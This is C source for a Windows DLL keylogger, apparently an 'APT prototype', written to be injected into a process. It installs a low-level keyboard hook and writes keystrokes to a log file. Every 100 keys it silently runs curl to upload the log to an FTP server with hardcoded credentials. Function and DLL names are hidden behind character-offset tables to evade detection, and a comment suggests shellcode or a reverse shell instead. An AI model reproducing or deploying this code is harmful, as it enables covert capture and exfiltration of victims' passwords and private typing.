#include <windows.h>
#include "native.h"
#include <stdlib.h>

#define MAX 600
NTSTATUS STATUS;
HHOOK hHook;
FILE *logFile = NULL; // File to log keystrokes
/*
p.s. this DLL needs a malicious code to inject it properly
what this dll should do?
	-when it's called by the vulnerable process it should decrypt shellcode in memory and execute it accordingly
	
	-OR you might use the reverse shell code to connect back to the attacker.
*/


HMODULE Get_Module(LPCWSTR Module_Name)
{
	HMODULE hModule;
	//printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%ls\t0x%p ]\n", Module_Name, hModule);
	return hModule;
}

HANDLE m_stuff(NtOpenMutant NT_OpenMutant, NtCreateMutant NT_CreateMutant,HANDLE hMux,ObjectAttributes *Object_Attr_mutant){
	
	STATUS = NT_OpenMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant);
	
	//STATUS_OBJECT_NAME_NOT_FOUND
	if(STATUS == 0xc0000034){
		//printf("[NT_OpenMutant] Mutant Object DOESN'T EXIST , status code 0x%lx\n",STATUS);
	}
	
	else if (STATUS == STATUS_SUCCESS){
		//printf("[NT_OpenMutant] Got Mutant Handle -> [0x%p]\n",hMux);
		//printf("[NT_OpenMutant] Mutant Object EXISTS\n");
		//printf("[x] EXITING\n");

		exit(0);
	}
	
	//printf("[NT_CreateMutant] Attempting to create mutant object\n");
	STATUS = NT_CreateMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant,TRUE);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NT_CreateMutant] Failed to create mutant object , error 0x%lx\n",STATUS);
		
		return EXIT_FAILURE;
	}
	//printf("[NT_CreateMutant] Created Mutant, Handle -> [0x%p]\n",hMux);
	//system("pause");
	
	return hMux;
}

char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

DWORD WINAPI MAIN_THREAD( LPVOID lpParam ){
	MAIN_LOGIC();
	return 0;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
			//MessageBoxA(NULL, "Malicious DLL Attached and Executed!!!!!!!", "WARNING", MB_ICONEXCLAMATION);
			HMODULE hNTDLL = Get_Module(L"NTDLL");
			HANDLE hThread;
			HANDLE hProcess = NtCurrentProcess();
			ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
			//CLIENT_ID CID;
			NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx"); 
			STATUS = NT_CreateThreadEx(&hThread,THREAD_ALL_ACCESS,&Object_Attr,hProcess,MAIN_THREAD,NULL,FALSE,0,0,0,NULL);
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
			//MessageBoxA(NULL, "Thread Created!", "WARNING", MB_ICONEXCLAMATION);
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            //MessageBoxA(NULL, "Thread Terminated!", "WARNING", MB_ICONEXCLAMATION);
			break;

        case DLL_PROCESS_DETACH:
    
			//MessageBoxA(NULL, "Process Terminated!", "WARNING", MB_ICONEXCLAMATION);
			break; // do not do cleanup if process termination scenario
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

int report(){
    
	//MessageBoxA(NULL, "REPORT FUNCTION", "Debug", MB_OK);
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};						//LoadLibraryA
	int cr_proc_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26};
	int dll_n__t_offset[] = {39,45,29,37,37};
	int w_4_single_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19}; //WaitForSingleObject
	


	HMODULE hK32 = Get_Module(L"Kernel32");
	// --- START GET LoadLibraryA function ---//
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
	// --- END GET LoadLibraryA function ---//
	

	// --- END LOAD user32 DLL ---//
	
	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
	if (hDLL_n__t == NULL){
		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)),hDLL_n__t);
	// --- END LOAD NTDLL DLL ---//
	
	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		return EXIT_FAILURE;
	}
	// --- END LOAD KERNEL32 DLL ---//
	FARPROC cr_proc_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_proc_offset,ALL_ALPHANUM,sizeof(cr_proc_offset)));	//CreateProcessA
	FARPROC w_4_single_func = GetProcAddress(hDLL_k_er_32,GetOriginal(w_4_single_offset,ALL_ALPHANUM,sizeof(w_4_single_offset))); //WaitForSingleObject
	NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t,"NtClose");
	//static int fileCounter = 1;
    
	
	if (logFile != NULL) {
        fclose(logFile);
        logFile = NULL; // Reset the file pointer
    }
	
	//ShowWindow(GetConsoleWindow(),SW_HIDE);
    const char *server = "192.168.100.13"; // Replace with your FTP server
    const char *username = "ftp_user_billy";        // Replace with your FTP username
    const char *password = "changeme";        // Replace with your FTP password
    const char *localFile = "C:\\Users\\ameru\\Desktop\\malware\\APT prototype\\log.log";  // Local file to upload
    const char *remoteFile = "log.log";             // Remote file name
	char curlCommand[512];
	//char remoteFile[256];
    //snprintf(remoteFile, sizeof(remoteFile), "keylog%d.log", fileCounter);
    snprintf(curlCommand, sizeof(curlCommand),
             "curl.exe -T \"%s\" ftp://192.168.100.13/upload/%s --user ftp_user_billy:changeme --silent",
             localFile, remoteFile);
			 
    // Initialize the STARTUPINFO structure
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
	//MessageBoxA(NULL, "SENDING LOG FILE", "Debug", MB_OK);
    // Create the process with CREATE_NO_WINDOW flag to suppress the console window
    if (cr_proc_func(
            NULL,           // No module name (use command line)
            curlCommand,    // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            CREATE_NO_WINDOW, // Creation flags: suppress console window
            NULL,           // Use parent's environment block
            NULL,           // Use parent's starting directory 
            &si,           // Pointer to STARTUPINFO structure
            &pi)           // Pointer to PROCESS_INFORMATION structure
    ) {
        // Wait until the process exits
        w_4_single_func(pi.hProcess, INFINITE);

        // Close process and thread handles
        NT_Close(pi.hProcess);
        NT_Close(pi.hThread);
	}
		
    return 0;
}

void LogKeystroke(DWORD key) {
    static int i = 0;
	
	if (logFile == NULL) {
        logFile = fopen("log.log", "a"); // Open the log file in append mode
        if (logFile == NULL) {
            //printf("Failed to open log file! Error\n");
            return;
        }
    }
		switch(key){
			case VK_BACK:
				fprintf(logFile, "[BACKSPACE]");
				fflush(logFile);	
				break;
			case VK_TAB:
				fprintf(logFile, "[TAB]");
				fflush(logFile);
				break;
			case VK_RETURN:
				fprintf(logFile, "\n");
				fflush(logFile);
				break;
			case VK_LSHIFT:
				fprintf(logFile, "[L-SHIFT]");
				fflush(logFile);
				break;
			case VK_RSHIFT:
				fprintf(logFile, "[R-SHIFT]");
				fflush(logFile);
				break;
			case VK_RCONTROL:
				fprintf(logFile, "[R-CTRL]");
				fflush(logFile);
				break;
			case VK_LCONTROL:
				fprintf(logFile, "[L-CTRL]");
				fflush(logFile);
				break;
			case VK_MENU:
				fprintf(logFile, "[ALT]");
				fflush(logFile);
				break;
			case VK_CAPITAL:
				fprintf(logFile, "[TAB]");
				fflush(logFile);
				break;
			case VK_NUMPAD0:
				fprintf(logFile, "0");
				fflush(logFile);
				break;
			case VK_NUMPAD1:
				fprintf(logFile, "1");
				fflush(logFile);
				break;
			case VK_NUMPAD2:
				fprintf(logFile, "2");
				fflush(logFile);
				break;				
			case VK_NUMPAD3:
				fprintf(logFile, "3");
				fflush(logFile);
				break;
			case VK_NUMPAD4:
				fprintf(logFile, "4");
				fflush(logFile);
				break;
			case VK_NUMPAD5:
				fprintf(logFile, "5");
				fflush(logFile);
				break;
			case VK_NUMPAD6:
				fprintf(logFile, "6");
				fflush(logFile);
				break;
			case VK_NUMPAD7:
				fprintf(logFile, "7");
				fflush(logFile);
				break;
			case VK_NUMPAD8:
				fprintf(logFile, "8");
				fflush(logFile);
				break;
			case VK_NUMPAD9:
				fprintf(logFile, "9");
				fflush(logFile);
				break;		
			default:
				fprintf(logFile, "%c", key);
				fflush(logFile); // Flush the buffer to ensure the key is written to the file
				break;
		}
		if (i == 100){
			fflush(logFile);
			report();
			i = 0;
		}
		i++;
		
}



LRESULT CALLBACK Hook_proc(
  int nCode, 
  WPARAM wParam, 
  LPARAM lParam
)
{
	
	KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *) lParam;
	if (wParam == WM_KEYDOWN){
		
		switch(pKey->vkCode){
			case VK_BACK:
				//printf("[BACKSPACE]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_TAB:
				//printf("[TAB]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_LSHIFT:
				//printf("[L-SHIFT]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_RSHIFT:
				//printf("[R-SHIFT]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_RETURN:
				//printf("[ENTER]\n");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_RCONTROL:
				//printf("[R-CTRL]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_LCONTROL:
				//printf("[L-CTRL]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_MENU:
				//printf("[ALT]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_CAPITAL:
				//printf("[TAB]");
				LogKeystroke(pKey->vkCode);
				break;
				
			case VK_NUMPAD0:
				//printf("0");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD1:
				//printf("1");
				LogKeystroke(pKey->vkCode);
				break;
				
			case VK_NUMPAD2:
				//printf("2");
				LogKeystroke(pKey->vkCode);
				break;
				
			case VK_NUMPAD3:
				//printf("3");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD4:
				//printf("4");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD5:
				//printf("5");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD6:
				//printf("6");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD7:
				//printf("7");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD8:
				//printf("8");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD9:
				//printf("9");
				LogKeystroke(pKey->vkCode);
				break;		
				
			default:
				//printf("%c",pKey->vkCode);	
				LogKeystroke(pKey->vkCode);
				break;
		}
		
	}
	

   return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int MAIN_LOGIC(){
	
	

	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";

		
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};						//LoadLibraryA
	int set_h_0_k_offset[] = {44,4,19,48,8,13,3,14,22,18,33,14,14,10,30,23,26};		//SetWindowsHookExA
	int un_h_0_k_offset[] = {46,13,7,14,14,10,48,8,13,3,14,22,18,33,14,14,10,30,23};	//UnhookWindowsHookEx
	int gt_m__5__g_offset[] = {32,4,19,38,4,18,18,0,6,4};								//GetMessage
	int trn_m__5__g_offset[] = {45,17,0,13,18,11,0,19,4,38,4,18,18,0,6,4};			//TranslateMessage
	int dis_m__5__g_offset[] = {29,8,18,15,0,19,2,7,38,4,18,18,0,6,4};				//DispatchMessage
	int us__32_d_11_offset[] = {20,18,4,17,55,54,62,3,11,11};						//user32.dll
	int dll_n__t_offset[] = {39,45,29,37,37};
	int cr_proc_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26};
	int w_4_single_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19}; //WaitForSingleObject
	HMODULE hK32 = Get_Module(L"Kernel32");
	// --- START GET LoadLibraryA function ---//
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
	// --- END GET LoadLibraryA function ---//
	

	
	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		return EXIT_FAILURE;
	}
	// --- END LOAD KERNEL32 DLL ---//
	
	// --- START LOAD user32 DLL --- //
	HMODULE hdll_us_32 = L_0_D_LIB(GetOriginal(us__32_d_11_offset,ALL_ALPHANUM,sizeof(us__32_d_11_offset)));
	if (hdll_us_32 == NULL){
		//printf("[x] COULD NOT LOAD user32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(us__32_d_11_offset,ALL_ALPHANUM,sizeof(us__32_d_11_offset)),hdll_us_32);
	
	// --- END LOAD user32 DLL ---//
	
	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
	if (hDLL_n__t == NULL){
		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)),hDLL_n__t);
	// --- END LOAD NTDLL DLL ---//
	
	// --- START GET FUNCTIONS --- //
	NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,"NtOpenMutant");
	NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
	FARPROC set_h_0_k_func = GetProcAddress(hdll_us_32,GetOriginal(set_h_0_k_offset,ALL_ALPHANUM,sizeof(set_h_0_k_offset))); //SetWindowsHookExA
	FARPROC un_h_0_k_func = GetProcAddress(hdll_us_32,GetOriginal(un_h_0_k_offset,ALL_ALPHANUM,sizeof(un_h_0_k_offset))); //UnhookWindowsHookEx
	FARPROC gt_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(gt_m__5__g_offset,ALL_ALPHANUM,sizeof(gt_m__5__g_offset))); //GetMessage
	FARPROC trn_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(trn_m__5__g_offset,ALL_ALPHANUM,sizeof(trn_m__5__g_offset))); //TranslateMessage
	FARPROC dis_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(trn_m__5__g_offset,ALL_ALPHANUM,sizeof(trn_m__5__g_offset))); //DispatchMessage
	FARPROC cr_proc_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_proc_offset,ALL_ALPHANUM,sizeof(cr_proc_offset)));	//CreateProcessA
	FARPROC w_4_single_func = GetProcAddress(hDLL_k_er_32,GetOriginal(w_4_single_offset,ALL_ALPHANUM,sizeof(w_4_single_offset))); //WaitForSingleObject
	// --- END GET FUNCTOINS --- //
	
	// --- START CREATE MUTEX --- //
	HANDLE hMux = NULL;
	ObjectAttributes Object_Attr_mutant = {sizeof(Object_Attr_mutant),NULL};
	UNICODE_STRING MutantName;
	RtlInitUnicodeString(&MutantName, L"\\BaseNamedObjects\\dll_192i312_mutant");
	Object_Attr_mutant.ObjectName = &MutantName;
	hMux=m_stuff(NT_OpenMutant,NT_CreateMutant,hMux,&Object_Attr_mutant);
	// --- END CREATE MUTEX --- //
	
	
	//MessageBoxA(NULL, "HOOKing", "Debug", MB_OK);
	hHook = set_h_0_k_func(WH_KEYBOARD_LL,Hook_proc,NULL,0);
	if (hHook == NULL){
		//printf("[x] HOOK wasn't installed\n");
		return 1;
		}
	//printf("[+] HOOK installed successfully\n");
	
	//printf("[+] before get message\n");
	MSG msg;
    while( ( GetMessage(&msg, NULL, 0, 0 )) != 0)
    { 
		//printf("[+] before translate message\n");
		trn_m__5__g_func(&msg); 
		//printf("[+] before dispatch message\n");
		dis_m__5__g_func(&msg); 
     
    }
	return 0;
}



